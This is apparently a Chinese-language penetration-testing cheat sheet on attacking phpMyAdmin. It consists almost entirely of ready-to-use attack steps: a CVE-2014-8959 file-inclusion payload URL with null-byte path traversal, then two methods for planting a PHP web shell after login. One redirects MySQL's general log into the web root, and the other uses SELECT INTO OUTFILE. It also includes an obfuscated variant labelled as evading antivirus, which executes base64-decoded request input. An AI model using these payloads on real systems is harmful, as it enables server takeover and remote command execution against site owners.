### phpmyadmin

```
[CVE-2014-8959] phpmyadmin任意文件包含漏洞

漏洞影响：
phpMyAdmin 
4.0.1 - 4.0.10.6
4.1.1 - 4.1.14.7 
4.2.1 - 4.2.12

php<=5.2

步骤：
1、登陆获取tooken
2、上传带php语句的文件，任意格式

payload:
http://192.168.91.151/phpMyAdmin-4.0.10/gis_data_editor.php?token=a45986475f70eca843086745cc69373c&gis_data[gis_type]=/../../../../x.txt%00

备注：
这个漏洞主要可以解决root不能写的问题
```

### 进入phpmyadmin后台getshell

#### 方法1、

```
SHOW VARIABLES LIKE '%general%'
set global general_log='on';
SET global general_log_file='D:/webshell/www/cmd.php';  //必须找到web程序的绝对路径
SELECT '<?php assert($_POST["cmd"]);?>';
----------------------------------------
免杀web语句查询
SELECT "<?php $p = array('f'=>'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?>"
----------------------------------------
```

#### 方法2、

```
SHOW VARIABLES LIKE '%secure_file_priv%'; 
select "一句话" into outfile "/var/www/html/webshell.php"
```

